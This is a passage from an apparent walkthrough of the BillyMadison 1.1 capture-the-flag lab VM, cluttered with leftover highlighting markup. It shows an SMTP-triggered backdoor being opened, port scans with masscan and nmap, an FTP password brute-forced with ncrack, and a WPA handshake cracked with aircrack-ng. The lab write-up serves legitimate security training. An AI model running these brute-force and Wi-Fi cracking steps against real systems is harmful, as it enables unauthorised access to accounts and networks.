</span><span class='line'><span class="m">331</span> User name okay, need password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> User logged in, proceed.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful.
</span><span class='line'><span class="m">150</span> Opening A mode data connection <span class="k">for</span> /.
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">5208</span> Aug <span class="m">20</span> 12:49 39773
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">9132</span> Aug <span class="m">20</span> 12:49 40054
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">6326</span> Aug <span class="m">20</span> 12:49 40049
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">868</span> Sep <span class="m">01</span> 10:42 .notes
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">5367</span> Aug <span class="m">20</span> 12:49 39772
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">1287</span> Aug <span class="m">20</span> 12:49 9129
</span><span class='line'><span class="m">226</span> Transfer completed.
</span></code></pre></td></tr></table></div></figure></p>

<p>I then downloaded all the files here.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/eric_ftp# cat .notes
</span><span class='line'>Ugh, this is frustrating.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I managed to make a system account <span class="k">for</span> myself. I also managed to hide Billy<span class="p">&amp;</span>rsquo<span class="p">;</span>s paper
</span><span class='line'>where he<span class="p">&amp;</span>rsquo<span class="p">;</span>ll never find it.  However, now I can<span class="p">&amp;</span>rsquo<span class="p">;</span>t find it either :-<span class="o">(</span>.
</span><span class='line'>To make matters worse, my privesc exploits aren<span class="p">&amp;</span>rsquo<span class="p">;</span>t working.&lt;br/&gt;
</span><span class='line'>One sort of worked, but I think I have it installed all backwards.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;If I<span class="p">&amp;</span>rsquo<span class="p">;</span>m going to maintain total control of Billy<span class="p">&amp;</span>rsquo<span class="p">;</span>s miserable life <span class="o">(</span>or what<span class="p">&amp;</span>rsquo<span class="p">;</span>s left of it<span class="o">)</span>
</span><span class='line'>I need to root the box and find that paper!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Fortunately, my SSH backdoor into the system IS working.&lt;br/&gt;
</span><span class='line'>All I need to <span class="k">do</span> is send an email that includes
</span><span class='line'>the text: <span class="p">&amp;</span>ldquo<span class="p">;</span>My kid will be a &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;_<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hint: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.youtube.com/watch?v=6u7RsW5SAgs&quot;</span>&gt;https://www.youtube.com/watch?v<span class="o">=</span>6u7RsW5SAgs&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The new secret port will be open and <span class="k">then</span> I can login from there with my wifi password, which I<span class="p">&amp;</span>rsquo<span class="p">;</span>m
</span><span class='line'>sure Billy or Veronica know.  I didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t see it in Billy<span class="p">&amp;</span>rsquo<span class="p">;</span>s FTP folders, but didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have <span class="nb">time </span>to
</span><span class='line'>check Veronica<span class="p">&amp;</span>rsquo<span class="p">;</span>s.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;-EG
</span></code></pre></td></tr></table></div></figure></p>

<p>By checking the youtube video, I got the sentence would be <code>My kid will be a soccer player</code></p>

<p>then I telnet to port 2525 for SMTP server and send the email to veronica:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# telnet 10.1.1.129 2525
</span><span class='line'>Trying 10.1.1.129<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'>Escape character is <span class="p">&amp;</span>lsquo<span class="p">;</span>^<span class="o">]</span><span class="p">&amp;</span>rsquo<span class="p">;</span>.
</span><span class='line'><span class="m">220</span> BM ESMTP SubEthaSMTP null
</span><span class='line'>EHLO kali
</span><span class='line'>250-BM
</span><span class='line'>250-8BITMIME
</span><span class='line'>250-AUTH LOGIN
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'>MAIL FROM:&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x65;&amp;#x72;&amp;#x69;&amp;#99;&amp;#x40;&amp;#x6d;&amp;#97;&amp;#x64;&amp;#105;&amp;#115;&amp;#x6f;&amp;#110;&amp;#x68;&amp;#x6f;&amp;#116;&amp;#101;&amp;#x6c;&amp;#115;&amp;#46;&amp;#99;&amp;#x6f;&amp;#109;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x65;&amp;#114;&amp;#x69;&amp;#x63;&amp;#x40;&amp;#109;&amp;#x61;&amp;#100;&amp;#105;&amp;#115;&amp;#x6f;&amp;#x6e;&amp;#x68;&amp;#111;&amp;#x74;&amp;#x65;&amp;#x6c;&amp;#x73;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d;&lt;/a&gt;</span>
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'>RCPT TO:&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#x76;&amp;#x76;&amp;#97;&amp;#x75;&amp;#103;&amp;#104;&amp;#110;&amp;#64;&amp;#x70;&amp;#111;&amp;#108;&amp;#121;&amp;#102;&amp;#101;&amp;#x63;&amp;#116;&amp;#x6f;&amp;#114;&amp;#46;&amp;#101;&amp;#100;&amp;#x75;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x76;&amp;#118;&amp;#x61;&amp;#117;&amp;#103;&amp;#104;&amp;#x6e;&amp;#64;&amp;#x70;&amp;#111;&amp;#x6c;&amp;#x79;&amp;#x66;&amp;#x65;&amp;#x63;&amp;#116;&amp;#x6f;&amp;#x72;&amp;#46;&amp;#101;&amp;#x64;&amp;#117;&lt;/a&gt;</span>
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'>DATA
</span><span class='line'><span class="m">354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;SUBJECT: email&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;My kid will be a soccer player&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;.
</span><span class='line'><span class="m">250</span> Ok
</span><span class='line'><span class="m">421</span> Timeout waiting <span class="k">for</span> data from client.
</span><span class='line'>Connection closed by foreign host.
</span></code></pre></td></tr></table></div></figure></p>

<p>After the email sent, I connected back to the smb shared folder to check the file <code>ebd.txt</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# smbclient //10.1.1.129/EricsSecretStuff
</span><span class='line'>WARNING: The <span class="p">&amp;</span>ldquo<span class="p">;</span>syslog<span class="p">&amp;</span>rdquo<span class="p">;</span> option is deprecated
</span><span class='line'>Enter root<span class="p">&amp;</span>rsquo<span class="p">;</span>s password:
</span><span class='line'><span class="nv">Domain</span><span class="o">=[</span>WORKGROUP<span class="o">]</span> <span class="nv">OS</span><span class="o">=[</span>Windows 6.1<span class="o">]</span> <span class="nv">Server</span><span class="o">=[</span>Samba 4.3.9-Ubuntu<span class="o">]</span>
</span><span class='line'>smb: &gt; ls
</span><span class='line'>  .                                   D        <span class="m">0</span>  Tue Dec <span class="m">13</span> 08:09:29 2016
</span><span class='line'>  ..                                  D        <span class="m">0</span>  Sat Aug <span class="m">20</span> 14:56:45 2016
</span><span class='line'>  131216070929482.eml                 N       <span class="m">96</span>  Tue Dec <span class="m">13</span> 08:09:29 2016
</span><span class='line'>  ._.DS_Store                        AH     <span class="m">4096</span>  Wed Aug <span class="m">17</span> 10:32:07 2016
</span><span class='line'>  131216070428392.eml                 N      <span class="m">267</span>  Tue Dec <span class="m">13</span> 08:04:28 2016
</span><span class='line'>  ebd.txt                             N       <span class="m">53</span>  Tue Dec <span class="m">13</span> 08:10:01 2016
</span><span class='line'>  .DS_Store                          AH     <span class="m">6148</span>  Wed Aug <span class="m">17</span> 10:32:12 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    <span class="m">30291996</span> blocks of size 1024. <span class="m">25921952</span> blocks available
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;smb: &gt; get ebd.txt
</span><span class='line'>getting file <span class="se">\e</span>bd.txt of size <span class="m">53</span> as ebd.txt <span class="o">(</span>1.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.1 KiloBytes/sec<span class="o">)</span>
</span><span class='line'>smb: &gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1# cat ebd.txt
</span><span class='line'>2016-12-13-07-11-01
</span><span class='line'>Erics backdoor is currently OPEN
</span></code></pre></td></tr></table></div></figure></p>

<p>so now, the backdoor is OPEN.</p>

<p>Then do a quick ports scan by using tool <code>masscan</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# masscan -p1-65535 10.1.1.129/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-12-13 13:08:00 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 69/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 21/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 139/tcp on 10.1.1.129                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 23/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 1974/tcp on 10.1.1.129                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 2525/tcp on 10.1.1.129                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.129                         &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Compared with previouse scanning result, the new port is <code>1974</code>, and then I use <code>nmap</code> to do a deeper scan on port <code>1974</code>, and found that SSH is running on it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# nmap -v -p1974 -sV 10.1.1.129&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>turncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>1974/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'>MAC Address: 00:0C:29:84:DA:45 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>turncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Next, from the previouse clues, <code>veronica</code> should have a FTP account, I then try to find the password by using <code>ncrack / medusa</code> with the wordlist <code>pass.lst</code> which is generated before from <code>rockyou.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ncrack -u veronica -P pass.lst -T <span class="m">5</span> 10.1.1.129 -p 21&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Ncrack 0.5 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://ncrack.org&quot;</span>&gt;http://ncrack.org&lt;/a&gt; <span class="o">)</span> at 2016-12-13 08:13 EST&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Discovered credentials <span class="k">for</span> ftp on 10.1.1.129 21/tcp:
</span><span class='line'>10.1.1.129 21/tcp &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp:&quot;</span>&gt;ftp:&lt;/a&gt; <span class="p">&amp;</span>lsquo<span class="p">;</span>veronica<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x62;&amp;#97;&amp;#98;&amp;#x79;&amp;#x67;&amp;#105;&amp;#x72;&amp;#x6c;&amp;#x5f;&amp;#x76;&amp;#101;&amp;#114;&amp;#x6f;&amp;#x6e;&amp;#x69;&amp;#99;&amp;#x61;&amp;#x30;&amp;#55;&amp;#64;&amp;#121;&amp;#97;&amp;#x68;&amp;#111;&amp;#111;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#98;&amp;#97;&amp;#98;&amp;#121;&amp;#103;&amp;#x69;&amp;#x72;&amp;#108;&amp;#95;&amp;#118;&amp;#x65;&amp;#114;&amp;#111;&amp;#x6e;&amp;#x69;&amp;#99;&amp;#x61;&amp;#x30;&amp;#x37;&amp;#64;&amp;#x79;&amp;#x61;&amp;#104;&amp;#x6f;&amp;#111;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109;&lt;/a&gt;&amp;rsquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Ncrack <span class="k">done</span>: <span class="m">1</span> service scanned in 189.04 seconds.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Ncrack finished.
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, now I login to the ftp as <code>veronica</code> and found there are 2 files:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder# ftp 10.1.1.129 21
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'><span class="m">220</span> Welcome to ColoradoFTP - the open <span class="nb">source </span>FTP server <span class="o">(</span>www.coldcore.com<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>10.1.1.129:root<span class="o">)</span>: veronica
</span><span class='line'><span class="m">331</span> User name okay, need password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> User logged in, proceed.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful.
</span><span class='line'><span class="m">150</span> Opening A mode data connection <span class="k">for</span> /.
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">595</span> Aug <span class="m">20</span> 12:55 email-from-billy.eml
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> ftp <span class="m">719128</span> Aug <span class="m">17</span> 12:16 eg-01.cap
</span><span class='line'>g226 Transfer completed.
</span></code></pre></td></tr></table></div></figure></p>

<p>Downloaded all of them, and check the email first:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder# cat email-from-billy.eml
</span><span class='line'>        Sat, <span class="m">20</span> Aug <span class="m">2016</span> 12:55:45 -0500 <span class="o">(</span>CDT<span class="o">)</span>
</span><span class='line'>Date: Sat, <span class="m">20</span> Aug <span class="m">2016</span> 12:55:40 -0500
</span><span class='line'>To: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#118;&amp;#x76;&amp;#97;&amp;#x75;&amp;#x67;&amp;#104;&amp;#x6e;&amp;#64;&amp;#x70;&amp;#111;&amp;#108;&amp;#121;&amp;#x66;&amp;#x65;&amp;#x63;&amp;#x74;&amp;#111;&amp;#x72;&amp;#46;&amp;#101;&amp;#100;&amp;#117;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x76;&amp;#x76;&amp;#97;&amp;#x75;&amp;#103;&amp;#x68;&amp;#110;&amp;#x40;&amp;#x70;&amp;#x6f;&amp;#108;&amp;#121;&amp;#102;&amp;#101;&amp;#99;&amp;#x74;&amp;#111;&amp;#x72;&amp;#x2e;&amp;#101;&amp;#100;&amp;#117;&lt;/a&gt;</span>
</span><span class='line'>From: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x62;&amp;#105;&amp;#108;&amp;#108;&amp;#121;&amp;#x40;&amp;#109;&amp;#x61;&amp;#100;&amp;#x69;&amp;#x73;&amp;#x6f;&amp;#110;&amp;#x68;&amp;#x6f;&amp;#116;&amp;#x65;&amp;#108;&amp;#115;&amp;#46;&amp;#x63;&amp;#111;&amp;#109;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x62;&amp;#x69;&amp;#x6c;&amp;#x6c;&amp;#121;&amp;#64;&amp;#x6d;&amp;#x61;&amp;#x64;&amp;#x69;&amp;#x73;&amp;#x6f;&amp;#x6e;&amp;#104;&amp;#x6f;&amp;#x74;&amp;#101;&amp;#108;&amp;#115;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109;&lt;/a&gt;</span>
</span><span class='line'>Subject: <span class="nb">test </span>Sat, <span class="m">20</span> Aug <span class="m">2016</span> 12:55:40 -0500
</span><span class='line'>X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
</span><span class='line'>Eric<span class="p">&amp;</span>rsquo<span class="p">;</span>s wifi&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hey VV,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;It<span class="p">&amp;</span>rsquo<span class="p">;</span>s your boy Billy here.  Sorry to leave in the middle of the night but I wanted to crack Eric<span class="p">&amp;</span>rsquo<span class="p">;</span>s wireless and <span class="k">then</span> mess with him.
</span><span class='line'>I wasn<span class="p">&amp;</span>rsquo<span class="p">;</span>t completely successful yet, but at least I got a start.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Kisses,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Billy
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, the other file is a <code>cap</code> file which sure enough is the wireless handshake traffic file. so I fire up <code>aircrack-ng</code> with <code>rockyou.txt</code> to crack the wireless password:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder# aircrack-ng -w /usr/share/wordlists/rockyou.txt eg-01.cap
</span><span class='line'>Opening eg-01.cap
</span><span class='line'>Read <span class="m">13003</span> packets.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="c">#  BSSID              ESSID                     Encryption&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="m">1</span>  02:13:37:A5:52:2E  EricGordon                WPA <span class="o">(</span><span class="m">1</span> handshake<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Choosing first network as target.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Opening eg-01.cap
</span><span class='line'>Reading packets, please <span class="nb">wait</span><span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;                             Aircrack-ng 1.2 rc4
</span><span class='line'>
</span><span class='line'>  <span class="o">[</span>00:18:52<span class="o">]</span> 1699632/9822768 keys tested <span class="o">(</span>1637.45 k/s<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>  Time left: <span class="m">1</span> hour, <span class="m">22</span> minutes, <span class="m">42</span> seconds                 17.30%
</span><span class='line'>
</span><span class='line'>                       KEY FOUND! <span class="o">[</span> triscuit* <span class="o">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  Master Key     : 9E 8B 4F E6 CC 5E E2 4C <span class="m">46</span> <span class="m">84</span> D2 AF <span class="m">59</span> 4B <span class="m">21</span> 6D
</span><span class='line'>                   B5 3B <span class="m">52</span> <span class="m">84</span> <span class="m">04</span> 9D D8 D8 <span class="m">83</span> <span class="m">67</span> AF <span class="m">43</span> DC <span class="m">60</span> CE <span class="m">92</span>
</span><span class='line'>
</span><span class='line'>  Transient Key  : 7A FA <span class="m">82</span> <span class="m">59</span> 5A 9A <span class="m">23</span> 6E 8C FB 1D 4B 4D <span class="m">47</span> BE <span class="m">13</span>
</span><span class='line'>                   D7 AC AC 4C <span class="m">81</span> 0F B5 A2 EE 2D 9F CC 8F <span class="m">05</span> D2 <span class="m">82</span>
</span><span class='line'>                   BF F4 4E AE 4E C9 ED EA <span class="m">31</span> <span class="m">37</span> 1E E7 <span class="m">29</span> <span class="m">10</span> <span class="m">13</span> <span class="m">92</span>
</span><span class='line'>                   BB <span class="m">87</span> 8A AE <span class="m">70</span> <span class="m">95</span> F8 <span class="m">62</span> <span class="m">20</span> B5 2B <span class="m">53</span> 8D 0C 5C DC
</span><span class='line'>
</span><span class='line'>  EAPOL HMAC     : <span class="m">86</span> <span class="m">63</span> <span class="m">53</span> 4B <span class="m">77</span> <span class="m">52</span> <span class="m">82</span> 0C <span class="m">73</span> 4A FA CA <span class="m">19</span> <span class="m">79</span> <span class="m">05</span> <span class="m">33</span>
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1/veronica-ftpfolder#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! now I would be able to login as Eric via the backdoor port <code>1974</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
